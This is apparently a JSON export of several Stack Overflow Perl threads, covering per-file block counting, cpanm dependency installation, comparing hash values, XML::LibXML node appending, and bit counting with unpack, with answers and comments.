larger.</p>\n\n<p>You could add a call to <code>close()</code> at the end of your loop. But I think it's a better idea to switch to using lexical filehandles instead - so they get closed automatically at the end of each iteration of the loop.</p>\n\n<pre><code>foreach my $filename (glob(...)) {\n  open my $fh, '&lt;', $filename or die ...;\n\n  local $/ = \"\\n\\n\"; # Always localise changes to $/!\n\n  while (&lt;$fh&gt;) {\n    ...\n  }\n}\n</code></pre>\n\n<p>As for your other question, I think you need some rather more drastic refactoring of your code. You seem to be adding a value to <code>@filelist</code> for every line in every file - and it sounds like you really only want one value in <code>@filelist</code> for each file.</p>\n\n<p>Something like this:</p>\n\n<pre><code>foreach my $filename (glob(...)) {\n  open my $fh, '&lt;', $filename or die ...;\n\n  local $/ = \"\\n\\n\"; # Always localise changes to $/!\n\n  my @data = &lt;$fh&gt;; # You don't seem to use this data anywhere\n  my $inode = (stat($filename))[1];\n  push @filelist, {\n    filename =&gt; $filename,\n    inode    =&gt; $inode,\n    count    =&gt; $.,\n  }\n}\n</code></pre>\n"}], "owner": {"reputation": 29, "user_id": 10139515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2141d0a96f9bdd495c21ca7afbb6935d?s=128&d=identicon&r=PG&f=1", "display_name": "AllanSimeoe", "link": "https://stackoverflow.com/users/10139515/allansimeoe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 120, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1532958596, "creation_date": 1532689220, "last_edit_date": 1532958596, "question_id": 51556588, "link": "https://stackoverflow.com/questions/51556588/find-the-number-of-blocks-of-text-in-a-file", "title": "Find the number of blocks of text in a file", "body": "<p>I have the following code</p>\n\n<pre><code>foreach my $filename (glob(\"$MY_DIR/applog_s*.log\")) {\n\n    open (FILE, $filename ) or die \"can't read open $filename\";\n\n    $/ = \"\\n\\n\";\n\n    while( &lt;FILE&gt; ) {\n        my $count = $.;\n        my @ino = stat($filename);\n        push @filelist, { filename =&gt; $filename , inode =&gt; $ino[1], nrow =&gt; $count};\n}\n</code></pre>\n\n<p>And the following data</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>\"$filelist{filename};$filelist{inode};$filelist{nrow}\"\n</code></pre>\n\n\n\n<pre><code>applog_s0.0.log;139279;1\napplog_s0.1.log;139279;2\napplog_s0.2.log;139279;3\napplog_s0.3.log;139279;4\napplog_s1.0.log;139281;5\napplog_s1.1.log;139281;6\napplog_s1.2.log;139281;7\napplog_s1.3.log;139281;8\napplog_s2.0.log;139285;9\napplog_s2.1.log;139285;10\napplog_s2.2.log;139285;11\napplog_s2.3.log;139285;12\napplog_s3.0.log;139287;13\napplog_s3.1.log;139287;14\napplog_s3.2.log;139287;15\napplog_s3.3.log;139287;16\n</code></pre>\n\n<p>I have two questions:</p>\n\n<ul>\n<li>How can I solve a bug about the counter? it doesn't restart from 1 when the file changes.</li>\n<li>How can I print the maximum value of my <code>nrow</code> for each filename?</li>\n</ul>\n\n<p><strong>New Solution <em>(it works)</em>:</strong></p>\n\n<pre><code>foreach my $filename (glob(\"$MY_DIR/applog_s*.log\")) {\nopen my $fh, '&lt;', $filename  or die \"can't read open $filename\";\n$/ = \"\\n\\n\";\nwhile( &lt;$fh&gt; ) {\n    my $inode = (stat($filename))[1];\n    my @lines = split /\\n\\n/;\n\n    ....\n    {My data capture}\n    ....\n\n    1 while &lt;$fh&gt;; my $count = $.;\n    push @filelist, {filename =&gt; $filename, inode =&gt; $inode, count =&gt; $count,}\n    }\nclose ($fh);\n}\n</code></pre>\n"}, {"tags": ["perl", "cpan"], "answers": [{"tags": [], "owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "is_accepted": false, "score": 5, "last_activity_date": 1532682057, "creation_date": 1532682057, "answer_id": 51554431, "question_id": 51554357, "link": "https://stackoverflow.com/questions/51554357/how-to-install-cpanm-dependencies/51554431#51554431", "title": "How to install cpanm dependencies?", "body": "<p>The instructions you are following seem to be wrong.</p>\n\n<p>You are trying to install your home directory as if it were a CPAN module\u2026 which it isn't.</p>\n\n<p>The instructions probably should have said to run that command after <code>cd</code>ing to wherever you extracted the install file to.</p>\n"}, {"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1532755947, "post_id": 51559405, "comment_id": 90102993, "body": "<code>cpanm</code> installs dependencies too."}, {"owner": {"reputation": 4644, "user_id": 1431720, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/f5a1388d4d3b2bf03b11bb5658c68c29?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/1431720/robert"}, "edited": false, "score": 0, "creation_date": 1541955654, "post_id": 51559405, "comment_id": 93386897, "body": "<code>cpanm</code> is also used by Travis-CI, so if you want automated builds on github, you&#39;ll have to use <code>cpanm</code>."}], "tags": [], "owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "is_accepted": false, "score": -1, "last_activity_date": 1532699376, "creation_date": 1532699376, "answer_id": 51559405, "question_id": 51554357, "link": "https://stackoverflow.com/questions/51554357/how-to-install-cpanm-dependencies/51559405#51559405", "title": "How to install cpanm dependencies?", "body": "<p>I wouldn't use the <code>cpanm</code> script use the <code>cpan</code> script instead. This handles the dependencies for you be default. You can find the correct parameters to use by doing <code>perldoc cpan</code> on the command line.</p>\n"}, {"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1532755921, "post_id": 51561247, "comment_id": 90102987, "body": "The absence of <code>cpanm</code> doesn&#39;t seem to be the problem here. That would give a completely different error message."}, {"owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532777081, "post_id": 51561247, "comment_id": 90107814, "body": "@DaveCross In which case, reinstalling it will update its dependencies and install any new ones."}], "tags": [], "owner": {"reputation": 3432, "user_id": 604642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/48daad611ba387f8473b0c1e5792aa3f?s=128&d=identicon&r=PG", "display_name": "shawnhcorey", "link": "https://stackoverflow.com/users/604642/shawnhcorey"}, "is_accepted": false, "score": -2, "last_activity_date": 1532705759, "creation_date": 1532705759, "answer_id": 51561247, "question_id": 51554357, "link": "https://stackoverflow.com/questions/51554357/how-to-install-cpanm-dependencies/51561247#51561247", "title": "How to install cpanm dependencies?", "body": "<p>You need to use <code>cpan</code> to install <code>cpanm</code>.</p>\n\n<pre><code>cpan App::cpanminus\n</code></pre>\n\n<p>This will install its dependencies automatically. Then you can use <code>cpanm</code> to install other modules.</p>\n\n<p>You can use <code>cpanm</code> to update itself.</p>\n\n<pre><code>cpanm App::cpanminus\n</code></pre>\n"}], "owner": {"reputation": 477, "user_id": 1172907, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/a9bf34d6ed8e613ac79e4188b70d9d9a?s=128&d=identicon&r=PG&f=1", "display_name": "412p9wej", "link": "https://stackoverflow.com/users/1172907/412p9wej"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 975, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1532705759, "creation_date": 1532681772, "question_id": 51554357, "link": "https://stackoverflow.com/questions/51554357/how-to-install-cpanm-dependencies", "title": "How to install cpanm dependencies?", "body": "<p>What can I do to make this working? </p>\n\n<p>I'm no perl expert thus I can't give anymore details except that a tools installation manual instructs me to run this line:</p>\n\n<pre><code>cd ~\ncpanm --sudo --installdeps .\n</code></pre>\n\n<p>Returns</p>\n\n<pre><code>--&gt; Working on .\nConfiguring /home/user ... N/A\n! Configuring . failed. See /home/user/.cpanm/work/1532680018.20391/build.log for details.\n</code></pre>\n\n<p>Log</p>\n\n<pre><code>cat /home/user/.cpanm/work/1532680018.20391/build.log\n\n\ncpanm (App::cpanminus) 1.7044 on perl 5.026002 built for x86_64-linux-thread-multi\nWork directory is /home/user/.cpanm/work/1532680018.20391\nYou have make /usr/bin/make\nYou have LWP 6.33\nYou have /usr/bin/tar: tar (GNU tar) 1.30\n\nYou have /usr/bin/unzip\n--&gt; Working on .\nEntering /home/user\nConfiguring /home/user\n-&gt; N/A\n! Configuring . failed. See /home/user/.cpanm/work/1532680018.20391/build.log for details.\n</code></pre>\n"}, {"tags": ["perl", "hash", "hashmap"], "comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1532679561, "post_id": 51553633, "comment_id": 90074328, "body": "Isn&#39;t <code>key</code> also not a match? How do you determine that they are the same? I think I would use <a href=\"https://metacpan.org/pod/Test::Deep::NoTest\" rel=\"nofollow noreferrer\">metacpan.org/pod/Test::Deep::NoTest</a> for this. Maybe with a <code>bag</code> comparison. That seems to be the laziest way I can think of, besides asking strangers on the internet to do it for me. ;)"}, {"owner": {"reputation": 3, "user_id": 10143122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e91bc3b8b041f707b2c21315b88216eb?s=128&d=identicon&r=PG&f=1", "display_name": "sarahJ", "link": "https://stackoverflow.com/users/10143122/sarahj"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1532679671, "post_id": 51553633, "comment_id": 90074375, "body": "@simbabque,The values in this case are strings so I think we can use <code>eq</code> operator  would prefer code instead of modules"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1532680036, "post_id": 51553633, "comment_id": 90074561, "body": "Modules are code. This looks a lot like a homework question to be honest. If that is the case, study the code of that module. It will help you understand what you need to do. And please explain the goal you have a little bit better. Your second code block is not very clear. I don&#39;t understand why you assign these numbers. And what about <code>key1</code>?"}, {"owner": {"reputation": 377, "user_id": 6583638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zobe.jpg?s=128&g=1", "display_name": "Flying_whale", "link": "https://stackoverflow.com/users/6583638/flying-whale"}, "edited": false, "score": 0, "creation_date": 1532683627, "post_id": 51553633, "comment_id": 90076618, "body": "I think that &quot;Taking out each key and iterating over arrays&quot; is the only way to do so. Maybe <code>grep</code> could be useful, it&#39;s a <i>maybe</i> I didn&#39;t try anything on this"}], "answers": [{"comments": [{"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1532687613, "post_id": 51555033, "comment_id": 90078844, "body": "Hello! Have you considered joining us at a German Perl Workshop or another Perl conference?"}, {"owner": {"reputation": 3, "user_id": 10143122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e91bc3b8b041f707b2c21315b88216eb?s=128&d=identicon&r=PG&f=1", "display_name": "sarahJ", "link": "https://stackoverflow.com/users/10143122/sarahj"}, "edited": false, "score": 1, "creation_date": 1532947672, "post_id": 51555033, "comment_id": 90149730, "body": "Thank you so much for taking your time to help me.It worked perfectly."}], "tags": [], "owner": {"reputation": 423, "user_id": 4969760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9e0df3fd6ebc11b67e7d388c1c681cf4?s=128&d=identicon&r=PG", "display_name": "Markus Ankenbrand", "link": "https://stackoverflow.com/users/4969760/markus-ankenbrand"}, "is_accepted": false, "score": 2, "last_activity_date": 1532684152, "creation_date": 1532684152, "answer_id": 51555033, "question_id": 51553633, "link": "https://stackoverflow.com/questions/51553633/how-to-compare-multiple-values-with-each-other-for-a-key-with-in-an-hash-in-perl/51555033#51555033", "title": "How to compare multiple values with each other for a key with in an hash in perl?", "body": "<p>In order to find your key of interest you can filter for those values that have more than one unique element. For <code>uniq</code> you can either use <a href=\"https://metacpan.org/pod/List::MoreUtils\" rel=\"nofollow noreferrer\"><code>List::MoreUtils</code></a> or if you want to avoid modules you can define the function yourself (<a href=\"https://perlmaven.com/unique-values-in-an-array-in-perl\" rel=\"nofollow noreferrer\">explanation here</a>)</p>\n\n<pre><code>sub uniq {\n  my %seen;\n  return grep { !$seen{$_}++ } @_;\n}\n</code></pre>\n\n<p>You can then filter the keys like this:</p>\n\n<pre><code># get an array of pairs of \"uniq count\" and \"key\"\nmy @key_counts = map {[uniq(@{$hash{$_}})+0, $_]} keys %hash;\n# filter this array for those with \"uniq count\" greater than 1 and only keep key\nmy @keys_of_interest = map {$_-&gt;[1]} grep {$_-&gt;[0] &gt; 1} @key_counts;\n# if you know that there is only a single key of interest\nmy $key = $keys_of_interest[0];\n</code></pre>\n\n<p>You can use this <code>$key</code> and the corresponding <code>value</code> to get your <code>%hash2</code>:</p>\n\n<pre><code>my %hash2;\n$hash2{$key}{$_} = 2 foreach(@{$hash{$key}});\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3, "user_id": 10143122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e91bc3b8b041f707b2c21315b88216eb?s=128&d=identicon&r=PG&f=1", "display_name": "sarahJ", "link": "https://stackoverflow.com/users/10143122/sarahj"}, "edited": false, "score": 0, "creation_date": 1532947008, "post_id": 51556270, "comment_id": 90149337, "body": "for some reason it only works when values are numerical, doesn&#39;t work when it&#39;s a string(combination of alphabets and numerical)"}, {"owner": {"reputation": 377, "user_id": 6583638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zobe.jpg?s=128&g=1", "display_name": "Flying_whale", "link": "https://stackoverflow.com/users/6583638/flying-whale"}, "reply_to_user": {"reputation": 3, "user_id": 10143122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e91bc3b8b041f707b2c21315b88216eb?s=128&d=identicon&r=PG&f=1", "display_name": "sarahJ", "link": "https://stackoverflow.com/users/10143122/sarahj"}, "edited": false, "score": 0, "creation_date": 1532949916, "post_id": 51556270, "comment_id": 90151124, "body": "true, that&#39;s because of the <code>==</code> that compares numbers, to compare strings you have to use <code>eq</code>"}, {"owner": {"reputation": 377, "user_id": 6583638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zobe.jpg?s=128&g=1", "display_name": "Flying_whale", "link": "https://stackoverflow.com/users/6583638/flying-whale"}, "reply_to_user": {"reputation": 3, "user_id": 10143122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e91bc3b8b041f707b2c21315b88216eb?s=128&d=identicon&r=PG&f=1", "display_name": "sarahJ", "link": "https://stackoverflow.com/users/10143122/sarahj"}, "edited": false, "score": 0, "creation_date": 1532950295, "post_id": 51556270, "comment_id": 90151409, "body": "@sarahJ edit: in fact, replacing <code>==</code> with <code>eq</code> will work for numerical values too, fixed the code ;)"}, {"owner": {"reputation": 3, "user_id": 10143122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e91bc3b8b041f707b2c21315b88216eb?s=128&d=identicon&r=PG&f=1", "display_name": "sarahJ", "link": "https://stackoverflow.com/users/10143122/sarahj"}, "edited": false, "score": 0, "creation_date": 1532952596, "post_id": 51556270, "comment_id": 90152876, "body": "Thanks for taking your time to help me out"}], "tags": [], "owner": {"reputation": 377, "user_id": 6583638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zobe.jpg?s=128&g=1", "display_name": "Flying_whale", "link": "https://stackoverflow.com/users/6583638/flying-whale"}, "is_accepted": true, "score": 1, "last_activity_date": 1532953515, "last_edit_date": 1532953515, "creation_date": 1532688117, "answer_id": 51556270, "question_id": 51553633, "link": "https://stackoverflow.com/questions/51553633/how-to-compare-multiple-values-with-each-other-for-a-key-with-in-an-hash-in-perl/51556270#51556270", "title": "How to compare multiple values with each other for a key with in an hash in perl?", "body": "<pre><code>use warnings;\nuse strict;\n\nmy @odd_keys;\n\nmy %hash = (key1 =&gt; [1],\n            key2 =&gt; [1,2],\n            key3 =&gt; [3,3,3],\n            key4 =&gt; [2,2,2]\n           );\n\nforeach my $key (keys(%hash))\n{\n  #builds an array with every cell equal to first cell \n  my @temp_array = grep {$_ eq $hash{$key}-&gt;[0]} @{$hash{$key}};\n  #if the size of this array is different than the size of array associated to key, that means that all values are not equal\n  if (@temp_array != @{$hash{$key}})\n  {\n    print \"$key\\n\"; \n    push(@odd_keys, $key);\n  }\n}\n</code></pre>\n\n<p>prints odd keys and creates an @odd_keys array</p>\n"}], "owner": {"reputation": 3, "user_id": 10143122, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e91bc3b8b041f707b2c21315b88216eb?s=128&d=identicon&r=PG&f=1", "display_name": "sarahJ", "link": "https://stackoverflow.com/users/10143122/sarahj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 287, "favorite_count": 0, "accepted_answer_id": 51556270, "answer_count": 2, "score": 0, "last_activity_date": 1532953515, "creation_date": 1532679081, "question_id": 51553633, "link": "https://stackoverflow.com/questions/51553633/how-to-compare-multiple-values-with-each-other-for-a-key-with-in-an-hash-in-perl", "title": "How to compare multiple values with each other for a key with in an hash in perl?", "body": "<p>I have an hash which looks something like this</p>\n\n<pre><code>my %hash = (key1 =&gt; [value1],\n           key2 =&gt; [value1,value2],\n           key3 =&gt; [value3,value3,value3],\n           key4 =&gt; [value2,value2,value2]\n           );\n</code></pre>\n\n<p>Now I want to compare these values with one other and pick out the odd key.i.e., the key for which all values are not same and in this case it's <code>key2</code>\nTaking out each key and iterating over arrays seem to be ordeal.Is there an easy way to do that?\nI want to use this odd key and print out values/give it a count in an hash\nfor ex.</p>\n\n<pre><code>   my %hash2;\n   $hash2{key2}{value1} =2;\n   $hash2{key2}{value2} =2;\n</code></pre>\n\n<p>How do I accomplish this?</p>\n"}, {"tags": ["perl", "xml-libxml"], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532679752, "post_id": 51553653, "comment_id": 90074409, "body": "I tried your code but it didn&#39;t work. I also tried with $body_node = $body_node-&gt;appendChild($node); but again didn&#39;t work."}, {"owner": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532680186, "post_id": 51553653, "comment_id": 90074644, "body": "Sorry, yes. Your code only added two nodes to newdoc. There are about 30 nodes in the source document that I should be matching on."}, {"owner": {"reputation": 43, "user_id": 10134195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/992be08906b17fa83ebfb1272b0e4b05?s=128&d=identicon&r=PG&f=1", "display_name": "PKI Guy", "link": "https://stackoverflow.com/users/10134195/pki-guy"}, "reply_to_user": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532680657, "post_id": 51553653, "comment_id": 90074864, "body": "and if you loop on <code>$newdoc-&gt;findnodes(&#39;&#47;&#47;body&#39;)[0]-&gt;appendChild($node);</code> any better ?"}, {"owner": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532681682, "post_id": 51553653, "comment_id": 90075464, "body": "That actually gives me a syntax error. I removed [0] and then I get the error &quot;Can&#39;t locate object method &quot;appendChild&quot; via package ...&quot;"}, {"owner": {"reputation": 43, "user_id": 10134195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/992be08906b17fa83ebfb1272b0e4b05?s=128&d=identicon&r=PG&f=1", "display_name": "PKI Guy", "link": "https://stackoverflow.com/users/10134195/pki-guy"}, "reply_to_user": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532685958, "post_id": 51553653, "comment_id": 90078016, "body": "yes i should have added extra ()  to encapsulate the method call before the [0]. but that wouldn&#39;t have worked better than my original reply. did you try also to loop on <code>$body_node-&gt;addSibling($node);</code> ?"}, {"owner": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532691216, "post_id": 51553653, "comment_id": 90080807, "body": "Your first suggestion of adding ($body_node) = $newdoc-&gt;findnodes(&#39;//body&#39;); to the loop is actually producing some good results if I convert the resulting $newdoc to a string and then save the string to file. In other words, not using $newdoc-&gt;toFile($outfile) fixes the problem. Thanks for your help, much appeciated."}, {"owner": {"reputation": 43, "user_id": 10134195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/992be08906b17fa83ebfb1272b0e4b05?s=128&d=identicon&r=PG&f=1", "display_name": "PKI Guy", "link": "https://stackoverflow.com/users/10134195/pki-guy"}, "reply_to_user": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532692931, "post_id": 51553653, "comment_id": 90081766, "body": "Edited my reply in case somebody needs it in the future."}, {"owner": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "edited": false, "score": 0, "creation_date": 1532700908, "post_id": 51553653, "comment_id": 90086501, "body": "You need to change the first line in the loop to $body_node = $body_node-&gt;appendChild($node); Thanks."}], "tags": [], "owner": {"reputation": 43, "user_id": 10134195, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/992be08906b17fa83ebfb1272b0e4b05?s=128&d=identicon&r=PG&f=1", "display_name": "PKI Guy", "link": "https://stackoverflow.com/users/10134195/pki-guy"}, "is_accepted": false, "score": 0, "last_activity_date": 1532709294, "last_edit_date": 1532709294, "creation_date": 1532679138, "answer_id": 51553653, "question_id": 51553522, "link": "https://stackoverflow.com/questions/51553522/perl-libxml-adding-nodes-in-a-loop/51553653#51553653", "title": "Perl LibXML adding nodes in a loop", "body": "<p>That means you probably need to come back to <code>&lt;body&gt;</code> after adding <code>&lt;div&gt;</code>:</p>\n\n<pre><code>my ($body_node) = $newdoc-&gt;findnodes('//body');\nmy @nodes = $source_doc-&gt;findnodes('//div[starts-with(@psname, \"xyz\")]');\nforeach my $node(@nodes) {\n    $body_node = $body_node-&gt;appendChild($node);\n    ($body_node) = $newdoc-&gt;findnodes('//body');\n}\nopen (OUT, \"&gt;$outfile\");\nprint OUT $newdoc-&gt;toString();\nclose OUT;\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 10114785, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/888cfa0aa9b506982b43df80f0b7cce9?s=128&d=identicon&r=PG&f=1", "display_name": "dgate", "link": "https://stackoverflow.com/users/10114785/dgate"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 48, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1532789798, "creation_date": 1532678732, "last_edit_date": 1532789798, "question_id": 51553522, "link": "https://stackoverflow.com/questions/51553522/perl-libxml-adding-nodes-in-a-loop", "title": "Perl LibXML adding nodes in a loop", "body": "<p>I'm trying to add nodes from one document to a new document I create, but it's not working and I don't know why. Here's the code that's going wrong:</p>\n\n<pre><code>my ($body_node) = $newdoc-&gt;findnodes('//body');\n    my @nodes = $source_doc-&gt;findnodes('//div[starts-with(@psname, \"xyz\")]');\n    foreach my $node(@nodes) {\n        $body_node = $body_node-&gt;appendChild($node);\n    }\n$newdoc-&gt;toFile($outfile);\n</code></pre>\n\n<p>The code looks for some named div tags and appends them to the body tag. The problem is that it's appending them to the last div tag, not to the body tag so I'm ending up with a bunch of nested divs:</p>\n\n<pre><code>&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; \n&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre>\n\n<p>If someone could tell me what I'm doing wrong I'd be eternally grateful. </p>\n"}, {"tags": ["perl", "bitvector"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532688817, "post_id": 51548322, "comment_id": 90079457, "body": "You have a bitmap with 2 billion bits?!"}, {"owner": {"reputation": 197, "user_id": 2280349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab88466841e97b4fbae94b85fd2259af?s=128&d=identicon&r=PG&f=1", "display_name": "TomWitt2", "link": "https://stackoverflow.com/users/2280349/tomwitt2"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532698067, "post_id": 51548322, "comment_id": 90084748, "body": "Quite often.  It&#39;s insane how fast unpack(&quot;%32b*&quot;) is at counting set bits.  You can do some amazing things with bit operations on bit vectors."}], "answers": [{"comments": [{"owner": {"reputation": 197, "user_id": 2280349, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ab88466841e97b4fbae94b85fd2259af?s=128&d=identicon&r=PG&f=1", "display_name": "TomWitt2", "link": "https://stackoverflow.com/users/2280349/tomwitt2"}, "edited": false, "score": 0, "creation_date": 1532700017, "post_id": 51548555, "comment_id": 90086006, "body": "Thanks for your assistance on this one.  You&#39;re a lifesaver (peppomint or perhaps cherry)."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 5, "last_activity_date": 1532706468, "last_edit_date": 1532706468, "creation_date": 1532645873, "answer_id": 51548555, "question_id": 51548322, "link": "https://stackoverflow.com/questions/51548322/in-perl-how-do-i-count-bits-in-a-bit-vector-which-has-bits-set-higher-than-2-14/51548555#51548555", "title": "In perl, how do I count bits in a bit vector which has bits set higher than 2_147_483_639?", "body": "<p>You can try counting by smaller pieces. It's slower, but it seems to work:</p>\n\n<pre><code>$bit_count = 0;\n$bit_count += unpack '%32b*', $1\n    while $bit_string =~ /(.{1,32766})/g;\n</code></pre>\n\n<p>Or slightly faster using <a 